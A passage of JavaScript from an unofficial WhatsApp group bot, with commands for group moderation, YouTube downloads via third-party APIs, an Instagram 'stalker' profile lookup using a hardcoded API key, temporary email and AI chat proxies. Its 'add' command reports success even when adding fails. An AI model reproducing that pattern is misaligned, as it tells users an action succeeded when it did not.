            replyphistar(`✅ ᴀᴜᴛᴏsᴛᴀᴛᴜsᴠɪᴇᴡ ᴇɴᴀʙʟᴇᴅ ғᴏʀ ${phonenumber}`);
        } else if (q === 'off') {
            PhistarBotInc.autostatusview = false;
            writeAutostatusview(phonenumber, 'off');
            replyphistar(`✅ ᴀᴜᴛᴏsᴛᴀᴛᴜsᴠɪᴇᴡ ᴅɪsᴀʙʟᴇᴅ ғᴏʀ ${phonenumber}`);
        } else {
            replyphistar(`ɪɴᴠᴀʟɪᴅ ᴏᴘᴛɪᴏɴ. ᴜsᴇ ${prefix + command} ᴏɴ/ᴏғғ`);
        }
    } catch (err) {
        console.error(`Error updating autostatusview for ${phonenumber}:`, err);
        replyphistar(`❌ Failed to update autostatusview: ${err.message}`);
    }
    break;
            case 'mode':
    if (!isCreator) return replyphistar(mess.owner);
    if (args.length < 1) return replyphistar(`ᴇxᴀᴍᴘʟᴇ ${prefix + command} ᴘᴜʙʟɪᴄ/sᴇʟғ`);
    const phoneNumber = PhistarBotInc.user.id.split(':')[0]; // Get the bot's phone number
    if (q === 'public') {
        PhistarBotInc.public = true;
        const fs = require('fs');
        const path = require('path');
        const modeFilePath = path.join(__dirname, 'phistar_sessions', 'modes.json');
        const readModes = () => {
            try {
                if (fs.existsSync(modeFilePath)) {
                    return JSON.parse(fs.readFileSync(modeFilePath, 'utf8'));
                }
                return {};
            } catch (err) {
                console.error('Error reading modes.json:', err);
                return {};
            }
        };
        const writeMode = (phoneNumber, mode) => {
            try {
                const modes = readModes();
                modes[phoneNumber] = mode;
                fs.writeFileSync(modeFilePath, JSON.stringify(modes, null, 2), { mode: 0o600 });
                console.log(`Mode updated for ${phoneNumber}: ${mode}`);
            } catch (err) {
                console.error('Error writing to modes.json:', err);
            }
        };
        writeMode(phoneNumber, 'public'); // Save to modes.json
        replyphistar(mess.done);
    } else if (q === 'self') {
        PhistarBotInc.public = false;
        const fs = require('fs');
        const path = require('path');
        const modeFilePath = path.join(__dirname, 'phistar_sessions', 'modes.json');
        const readModes = () => {
            try {
                if (fs.existsSync(modeFilePath)) {
                    return JSON.parse(fs.readFileSync(modeFilePath, 'utf8'));
                }
                return {};
            } catch (err) {
                console.error('Error reading modes.json:', err);
                return {};
            }
        };
        const writeMode = (phoneNumber, mode) => {
            try {
                const modes = readModes();
                modes[phoneNumber] = mode;
                fs.writeFileSync(modeFilePath, JSON.stringify(modes, null, 2), { mode: 0o600 });
                console.log(`Mode updated for ${phoneNumber}: ${mode}`);
            } catch (err) {
                console.error('Error writing to modes.json:', err);
            }
        };
        writeMode(phoneNumber, 'self'); // Save to modes.json
        replyphistar(mess.done);
    } else {
        replyphistar(`Invalid mode. Use ${prefix + command} public/self`);
    }
    break;
            

            case 'closetime':
                if (!m.isGroup) return replyphistar(mess.group)
                
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyphistar('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyphistar(`ᴄʟᴏsᴇ ᴛɪᴍᴇ ${q} sᴛᴀʀᴛɪɴɢ ғʀᴏᴍ ɴᴏᴡ`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*ᴄʟᴏsᴇᴅ* ɢʀᴏᴜᴘ ᴄʟᴏsᴇᴅ ʙʏ ᴀᴅᴍɪɴ\nnow ᴏɴʟʏ ᴀᴅᴍɪɴ ᴄᴀɴ sᴇɴᴅ ᴍᴇssᴀɢᴇs`
                    PhistarBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replyphistar(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyphistar(mess.group)
    
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyphistar('*ᴄʜᴏᴏsᴇ:*\nsᴇᴄᴏɴᴅ\nᴍɪɴᴜᴛᴇ\nʜᴏᴜʀ\nᴅᴀʏ\n\n*ᴇxᴀᴍᴘʟᴇ*\n10 sᴇᴄᴏɴᴅ')
                }
                replyphistar(`ᴏᴘᴇɴ ᴛɪᴍᴇ ${q} sᴛᴀʀᴛɪɴɢ ғʀᴏᴍ ɴᴏᴡ`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*ᴏᴘᴇɴᴇᴅ* ᴛʜᴇ ɢʀᴏᴜᴘ ɪs ᴏᴘᴇɴᴇᴅ ʙʏ ᴀᴅᴍɪɴ\nɴᴏᴡ ᴍᴇᴍʙᴇʀs ᴄᴀɴ sᴇɴᴅ ᴍᴇssᴀɢᴇs`
                    PhistarBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replyphistar(open)
                }, timer)
                break
            case 'kick':
    if (!m.isGroup) return replyphistar('ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜsᴇᴅ ɪɴ ɢʀᴏᴜᴘs.')
      if (!isAdmins && !isCreator) return replyphistar('Restricted ᴛᴏ ᴀᴅᴍɪɴs ᴀɴᴅ ᴄʀᴇᴀᴛᴏʀs');

    if (!m.mentionedJid[0] && !m.quoted && !args[0]) 
        return replyphistar(`ᴇxᴀᴍᴘʟᴇ: ${prefix + command} @user or reply ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (e.g., +509xxxxxxxx)`)

    // Get the user ID from mention, quoted message, or phone number
    let userId = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : null)
    if (!userId && args[0]) {
        // Validate and sanitize phone number
        const phoneNumber = args[0].replace(/[^0-9]/g, '') // Remove non-digits (e.g., +, spaces)
        if (phoneNumber.length < 7 || phoneNumber.length > 15) {
            return replyphistar('❌ Invalid phone number! Please provide a valid phone number (e.g., +509xxxxxxxx).')
        }
        userId = `${phoneNumber}@s.whatsapp.net`
    }

    if (!userId) return replyphistar('❌ Invalid user! Please mention a user, reply to their message, or provide a valid phone number.')
    if (userId === PhistarBotInc.user.id) return replyphistar('❌ ᴄᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴛʜᴇ ʙᴏᴛ!')
    if (userId === groupOwner) return replyphistar('❌ ᴄᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ᴏᴡɴᴇʀ!')
    if (groupMetadata.participants.find(p => p.id === userId && p.admin)) 
        return replyphistar('❌ Cannot remove a group admin!')

    // Check if the user is in the group
    const isParticipant = groupMetadata.participants.some(p => p.id === userId)
    if (!isParticipant) {
        const userNumber = userId.split('@')[0]
        return replyphistar(`❌ User +${userNumber} is not a member of this group.`, { mentions: [userId] })
    }

    try {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [userId], 'remove')
        const userNumber = userId.split('@')[0]
        await replyphistar(`✅ sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇᴍᴏᴠᴇᴅ +${userNumber} ғʀᴏᴍ ᴛʜᴇ ɢʀᴏᴜᴘ.`, { mentions: [userId] })
        await delay(1000) // Delay to ensure smooth execution
    } catch (err) {
        console.error(`Failed to remove user from accounting system. User ID: ${userId}`, err)
        const userNumber = userId.split('@')[0]
        await replyphistar(`❌ Failed to remove +${userNumber} due to an error.`, { mentions: [userId] })
    }
    break
            case 'add':
    if (!m.isGroup) return replyphistar(mess.group); 
    let userToAdd = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; // Extract the number
    try {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
        replyphistar(`ᴜsᴇʀ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ: ${userToAdd}`);
    } catch (err) {
        console.error(err);
        replyphistar('User ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.');
    }
    break;
    
// Music Download Command
case 'play2': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        // Show waiting message
        await replyphistar('🎵 Searching for your song...');

        // Using YouTube Play API
        const searchUrl = `https://apis.prexzyvilla.site/download/play?q=${encodeURIComponent(text)}`;
        const searchRes = await axios.get(searchUrl);

        if (!searchRes.data.status || !searchRes.data.data) {
            return replyphistar(`*No results found for:* ${text}`);
        }

        const songData = searchRes.data.data;
        const { title, author, duration, thumbnail, url } = songData.metadata;
        const downloadUrl = songData.download.download_url;

        // Send song info with actual thumbnail
        const infoMessage = `*ᴍᴜsɪᴄ ᴘʟᴀʏᴇʀ*\n` +
                            `🎵 *ᴛɪᴛʟᴇ:* ${title}\n` +
                            `🎤 *ᴀʀᴛɪsᴛ:* ${author}\n` +
                            `⏱️ *ᴅᴜʀᴀᴛɪᴏɴ:* ${duration}\n` +
                            `🔗 *sᴏᴜʀᴄᴇ:* ʏᴏᴜᴛᴜʙᴇ`;

        await PhistarBotInc.sendMessage(m.chat, {
            caption: infoMessage,
            image: { url: thumbnail }
        }, { quoted: qtext2 });

        // Download and send the audio
        await PhistarBotInc.sendMessage(m.chat, {
            audio: { url: downloadUrl },
            mimetype: 'audio/mp4',
            fileName: `${title.replace(/[^\w\s]/gi, '')}.mp3`,
            caption: `🎧 *ʜᴇʀᴇ's ʏᴏᴜʀ sᴏɴɢ:*\n${title} - ${author}`
        }, { quoted: qtext2 });

    } catch (err) {
        console.error('Error in play2:', err);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

// Video Download Command
case 'video': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} Wizkid Essence`);

    try {
        // Step 1: Search YouTube using yts
        const search = await yts(text);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for: *${text}*`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const videoThumbnail = video.thumbnail;
        const author = video.author.name;

        // Step 2: Send search preview
        const infoMessage = 
`🎥 *ᴠɪᴅᴇᴏ ғᴏᴜɴᴅ*

*ᴛɪᴛʟᴇ:* ${videoTitle}
*ʏᴏᴜᴛᴜʙᴇ ʟɪɴᴋ:* ${videoUrl}

💬 ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ *ᴠɪᴅᴇᴏ* ғᴏʀ ʏᴏᴜ...`;

        await PhistarBotInc.sendMessage(m.chat, {
            caption: infoMessage,
            image: { url: videoThumbnail }
        }, { quoted: qtext2 });

        // Step 3: Fetch video download link using PrexzyVilla API
        const apiUrl = `https://apis.prexzyvilla.site/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const { data } = await axios.get(apiUrl);

        if (data.status && data.data) {
            const { downloadURL, title } = data.data;

            // Step 4: Send the video file
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: downloadURL },
                mimetype: 'video/mp4',
                fileName: `${title.replace(/[^\w\s]/gi, '')}.mp4`,
                caption: `🎬 *ʜᴇʀᴇ's ʏᴏᴜʀ ᴠɪᴅᴇᴏ:*\n${title} - ${author}`
            }, { quoted: qtext2 });
        } else {
            replyphistar("❌ Failed to fetch the video. Please try again.");
        }

    } catch (error) {
        console.error("Error in video command:", error);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

case 'play': {
    if (!text) return replyphistar(`*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} sᴏɴɢ ɴᴀᴍᴇ`);

    try {
        const search = await yts(text);
        const video = search.videos[0];
        if (!video) return replyphistar(`❌ No results found for: *${text}*`);

        const videoUrl = video.url;
        const videoTitle = video.title;
        const videoThumbnail = video.thumbnail;
        const author = video.author.name;

        // Send processing message
        const infoMessage = `🎵 *ᴘʀᴏᴄᴇssɪɴɢ ʀᴇǫᴜᴇsᴛ*\n\n*ᴛɪᴛʟᴇ:* ${videoTitle}\n*ᴀʀᴛɪsᴛ:* ${author}\n\n⏳ *ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴀᴜᴅɪᴏ...*`;
        await PhistarBotInc.sendMessage(m.chat, { 
            image: { url: videoThumbnail }, 
            caption: infoMessage 
        }, { quoted: qtext2 });

        // Call YOUR Vercel API (this is the key change!)
        const apiUrl = `https://phi-star.vercel.app/api/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const { data } = await axios.get(apiUrl, { timeout: 30000 });

        // Check your API's response format
        if (data.success && data.data && data.data.downloadURL) {
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: data.data.downloadURL },
                mimetype: 'audio/mpeg',
                fileName: `${data.data.title.substring(0, 100).replace(/[^\w\s.-]/gi, '')}.mp3`,
                caption: `✅ *ɴᴏᴡ ᴘʟᴀʏɪɴɢ:* ${data.data.title}\n🎤 *ᴀʀᴛɪsᴛ:* ${author}`
            }, { quoted: qtext2 });
        } else {
            replyphistar(`❌ API Error: ${data.error || 'Failed to process audio'}`);
        }

    } catch (error) {
        console.error('Play command error:', error);
        
        let errorMessage = '❌ Failed to process the song. Please try again.';
        if (error.code === 'ECONNABORTED') {
            errorMessage = '⏰ Timeout: Server took too long to respond.';
        } else if (error.response?.status === 502) {
            errorMessage = '🔧 Service temporarily unavailable.';
        }
        
        replyphistar(errorMessage);
    }
    break;
}
case 'song': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} Morayo by Wizkid`);

    try {
        const query = text.trim();
        replyphistar('🔍 sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ʏᴏᴜʀ sᴏɴɢ ʀᴇǫᴜᴇsᴛ...');

        // Step 1: Search YouTube using yts for video data
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for: *${query}*`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const videoThumbnail = video.thumbnail;
        const videoDuration = video.duration.timestamp;
        const author = video.author.name;

        // Step 2: Send preview
        const infoMessage = `*ᴍᴜsɪᴄ ᴘʟᴀʏᴇʀ*\n` +
                            `🎵 *ᴛɪᴛʟᴇ:* ${videoTitle}\n` +
                            `🎤 *ᴀʀᴛɪsᴛ:* ${author}\n` +
                            `⏱️ *ᴅᴜʀᴀᴛɪᴏɴ:* ${videoDuration}\n` +
                            `🔗 *sᴏᴜʀᴄᴇ:* ʏᴏᴜᴛᴜʙᴇ`;

        await PhistarBotInc.sendMessage(m.chat, {
            caption: infoMessage,
            image: { url: videoThumbnail }
        }, { quoted: qtext2 });

        // Step 3: Fetch audio download link using PrexzyVilla play API
        const audioApiUrl = `https://apis.prexzyvilla.site/download/play?q=${encodeURIComponent(query)}`;
        const audioRes = await axios.get(audioApiUrl);

        if (audioRes.data.status && audioRes.data.data) {
            const { download_url } = audioRes.data.data.download;
            const { title } = audioRes.data.data.metadata;

            // Step 4: Send the audio as a voice note
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: download_url },
                mimetype: 'audio/mp4',
                ptt: true, // Send as voice note
                fileName: `${title.replace(/[^\w\s]/gi, '')}.mp3`,
                caption: `🎧 *ʜᴇʀᴇ's ʏᴏᴜʀ sᴏɴɢ:*\n${title} - ${author}`
            }, { quoted: qtext2 });
        } else {
            replyphistar("❌ Failed to fetch the audio. Please try again.");
        }

        // Step 5: Fetch video download link using PrexzyVilla ytmp4 API
        const videoApiUrl = `https://apis.prexzyvilla.site/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const videoRes = await axios.get(videoApiUrl);

        if (videoRes.data.status && videoRes.data.data) {
            const { downloadURL, title } = videoRes.data.data;

            // Step 6: Send the video
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: downloadURL },
                mimetype: 'video/mp4',
                fileName: `${title.replace(/[^\w\s]/gi, '')}.mp4`,
                caption: `🎬 *ʜᴇʀᴇ ɪs ʏᴏᴜʀ ᴠɪᴅᴇᴏ:*\n${title} - ${author}`
            }, { quoted: qtext2 });
        } else {
            replyphistar("❌ Failed to fetch the video. Please try again.");
        }

    } catch (err) {
        console.error("Error in song command:", err);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
// Text to PDF Command

case 'playdoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your audio file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎶 *ᴀᴜᴅɪᴏ ғɪʟᴇ ғᴏᴜɴᴅ* 🎶\n\n` +
                     `🎵 *ᴛɪᴛʟᴇ:* ${videoTitle}\n` +
                     `🔗 *ʏᴏᴜᴛᴜʙᴇ ʟɪɴᴋ:* ${videoUrl}\n\n` +
                     `📁 ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ *ᴀᴜᴅɪᴏ ғɪʟᴇ* ғᴏʀ ʏᴏᴜ...`
        }, { quoted: qtext2 });

        // Step 3: Fetch audio document download link using PrexzyVilla API
        const audioApiUrl = `https://apis.prexzyvilla.site/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const audioResponse = await axios.get(audioApiUrl);

        if (audioResponse.data.status && audioResponse.data.data) {
            const { downloadURL, title } = audioResponse.data.data;

            // Step 4: Send the audio file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: downloadURL },
                mimetype: 'audio/mpeg',
                fileName: `${title}.mp3`,
                caption: `📁 *ᴀᴜᴅɪᴏ ғɪʟᴇ:* ${title}.mp3`
            }, { quoted: qtext2 });
        } else {
            replyphistar("❌ Failed to fetch the audio file. Try again.");
        }

    } catch (err) {
        console.error("Error in playdoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'videodoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ʏᴏᴜʀ ᴠɪᴅᴇᴏ ғɪʟᴇ...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎬 *ᴠɪᴅᴇᴏ ғɪʟᴇ ғᴏᴜɴᴅ* 🎬\n\n` +
                     `🎥 *ᴛɪᴛʟᴇ:* ${videoTitle}\n` +
                     `🔗 *ʏᴏᴜᴛᴜʙᴇ ʟɪɴᴋ:* ${videoUrl}\n\n` +
                     `📁 ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ *ᴠɪᴅᴇᴏ ғɪʟᴇ* ғᴏʀ ʏᴏᴜ...`
        }, { quoted: qtext2 });

        // Step 3: Fetch video document download link using PrexzyVilla API
        const videoApiUrl = `https://apis.prexzyvilla.site/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const videoResponse = await axios.get(videoApiUrl);

        if (videoResponse.data.status && videoResponse.data.data) {
            const { downloadURL, title } = videoResponse.data.data;

            // Step 4: Send the video file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: downloadURL },
                mimetype: 'video/mp4',
                fileName: `${title}.mp4`,
                caption: `📁 *ᴠɪᴅᴇᴏ ғɪʟᴇ:* ${title}.mp4`
            }, { quoted: qtext2 });
        } else {
            replyphistar("❌ Failed to fetch the video file. Try again.");
        }

    } catch (err) {
        console.error("Error in videodoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}
  
case 'instagramstalk': case 'igstalk': {
    if (!text) return replyphistar('Please provide a username.\nExample: .igstalk davido');
    
    const username = text.trim(); // Extract the username
    const isLowercase = /^[a-z0-9_.]+$/.test(username); // Validate for lowercase and valid Instagram usernames

    // Reject input if it contains uppercase letters or invalid characters
    if (!isLowercase) {
        return replyphistar('Please use lowercase letters only for the username.\nExample: .igstalk davido');
    }

    try {
        const apiKey = 'gifted-md'; // API key
        const apiUrl = `https://api.giftedtech.my.id/api/stalk/igstalkv2?apikey=${apiKey}&username=${username}`;

        // Fetch Instagram details
        const response = await axios.get(apiUrl);

        if (response.data.status === 200 && response.data.success) {
            const { profile, username, fullName, bio, posts, followers, following } = response.data.result;

            // Construct the reply message
            const message = `*ɪɴsᴛᴀɢʀᴀᴍ sᴛᴀʟᴋᴇʀ*\n\n` +
                            `🔹 *ᴜsᴇʀɴᴀᴍᴇ:* ${username}\n` +
                            `🔹 *ғᴜʟʟ ɴᴀᴍᴇ:* ${fullName}\n` +
                            `🔹 *ʙɪᴏ:* ${bio}\n` +
                            `🔹 *ᴘᴏsᴛs:* ${posts}\n` +
                            `🔹 *ғᴏʟʟᴏᴡᴇʀs:* ${followers}\n` +
                            `🔹 *ғᴏʟʟᴏᴡɪɴɢ:* ${following}`;

            // Send the response with profile picture
            await PhistarBotInc.sendMessage(m.chat, { 
                caption: message, 
                image: { url: profile }
            }, { quoted: qtext2 });
        } else {
            // Handle unsuccessful response
            replyphistar(`Failed to fetch details for username "${username}".\nReason: ${response.data.message || 'Unknown error.'}`);
        }
    } catch (error) {
        // Handle specific errors without logging to console
        if (error.response) {
            replyphistar(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('No response received from the API. Please try again later.');
        } else {
            replyphistar(`An error occurred: ${error.message}`);
        }
    }
    break;
}

case "tempmail":
case "tmpmail":
case "newmail": {
    if (!tempMailData[m.sender]) {
        try {
            // Generate a random email using 1SecMail API
            const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
            const data = response.data[0];

            if (!data) {
                return replyphistar("❌ Failed to generate a temporary email. Please try again.");
            }

            // Save the generated email for the user
            tempMailData[m.sender] = { email: data };
            replyphistar(`✅ *ᴛᴇᴍᴘᴏʀᴀʀʏ ᴇᴍᴀɪʟ ᴄʀᴇᴀᴛᴇᴅ:*\n\n📧 ᴇᴍᴀɪʟ: ${data}\n\nUse *${prefix}ᴄʜᴇᴄᴋᴍᴀɪʟ* ᴛᴏ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ɪɴʙᴏx.\nUse *${prefix}ᴅᴇʟᴍᴀɪʟ* ᴛᴏ ᴅᴇʟᴇᴛᴇ ʏᴏᴜʀ ᴇᴍᴀɪʟ.`);
        } catch (error) {
            console.error(error);
            replyphistar("❌ An error occurred while creating a temporary email. Please try again.");
        }
    } else {
        replyphistar(`📧 *You already have a temporary email:*\n\n${tempMailData[m.sender].email}\n\nUse *${prefix}checkmail* to check your inbox.`);
    }
    break;
}

// **Check Emails**
case "checkmails":
case "readmail":
case "reademail": {
    const userMail = tempMailData[m.sender];
    if (!userMail) {
        return replyphistar(`❌ You don't have a temporary email. Use *${prefix}tempmail* to create one.`);
    }

    try {
        // Get the list of emails from the inbox using 1SecMail API
        const [login, domain] = userMail.email.split('@');
        const response = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);
        
        const inbox = response.data;
        if (!inbox || inbox.length === 0) {
            return replyphistar(`📭 *No mails received yet!*\nUse *${prefix}delmail* to delete mail.`);
        }

        let messageList = "📩 *ʏᴏᴜʀ ᴇᴍᴀɪʟs:*\n\n";
        for (const email of inbox) {
            messageList += `📧 *ғʀᴏᴍ:* ${email.from}\n🗓️ *ᴅᴀᴛᴇ:* ${email.date}\n✉️ *sᴜʙᴊᴇᴄᴛ:* ${email.subject}\n🔑 *ɪᴅ:* ${email.id}\n\n`;
        }
        replyphistar(messageList.trim());
    } catch (error) {
        console.error(error);
        replyphistar("❌ An error occurred while checking emails. Please try again.");
    }
    break;
}

// **Delete Temporary Email**
case "delmail":
case "deletemail":
case "deltemp":
case "deltmp": {
    const userMail = tempMailData[m.sender];
    if (userMail) {
        try {
            // Delete the temporary email using 1SecMail API
            const [login, domain] = userMail.email.split('@');
            const response = await axios.get(`https://www.1secmail.com/api/v1/?action=deleteMailbox&login=${login}&domain=${domain}`);
            
            if (response.data.result === 'success') {
                delete tempMailData[m.sender]; // Remove from local storage
                replyphistar("✅ Your temporary email has been deleted.");
            } else {
                replyphistar("❌ Failed to delete your temporary email. Please try again.");
            }
        } catch (error) {
            console.error(error);
            replyphistar("❌ An error occurred while deleting your temporary email. Please try again.");
        }
    } else {
        replyphistar("❌ You don't have a temporary email to delete.");
    }
    break;
}

            case 'restart':
                if (!isCreator) return replyphistar(mess.owner)
                replyphistar('In Process....')
                exec('pm2 restart all')
                break
                
            case 'autoread':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`ᴇxᴀᴍᴘʟᴇ ${prefix + command} ᴏɴ/ᴏғғ`)
                if (q === 'on') {
                    autoread = true
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏʀᴇᴀᴅ ᴛᴏ ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏʀᴇᴀᴅ ᴛᴏ ${q}`)
                }
                break
                
                case 'autotyping':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} ᴏɴ/ᴏғғ`)
                if (q === 'on') {
                    autoTyping = true
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏ-ᴛʏᴘɪɴɢ ᴛᴏ ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏ-ᴛʏᴘɪɴɢ ᴛᴏ ${q}`)
                }
                break
                
                case 'autorecording':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏ-ʀᴇᴄᴏʀᴅɪɴɢ ᴛᴏ ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏ-ʀᴇᴄᴏʀᴅɪɴɢ ᴛᴏ ${q}`)
                }
                break
                
                case 'autorecordtyp':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏ ʀᴇᴄᴏʀᴅɪɴɢ ᴀɴᴅ ᴛʏᴘɪɴɢ ᴛᴏ ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏ ʀᴇᴄᴏʀᴅɪɴɢ ᴀɴᴅ ᴛʏᴘɪɴɢ ᴛᴏ ${q}`)
                }
                break
                


//NEW COMMANDS FOR V3
case "copilot": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/copilot?text=${encodeURIComponent(text)}`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "githubroaster": {
    if (!text) return replyphistar(`❌ Give Me A Github Username`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai-persona/githubroaster?username=${encodeURIComponent(text)}`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "nemotron": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=nemotron-70b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "qwen2": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });

    try {
        let response = await axios.get(`https://api.paxsenix.biz.id/ai/huggingchat?text=${encodeURIComponent(text)}&model=qwen-2.5-72b`);
        
        replyphistar(response.data.message);
        
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar("❌ An error occurred while fetching the response.");
    }
}
break;

case "llama3.3": {
    if (!text) return replyphistar(`❌ Please provide a query.\n\nExample: ${prefix + command} Hello`);

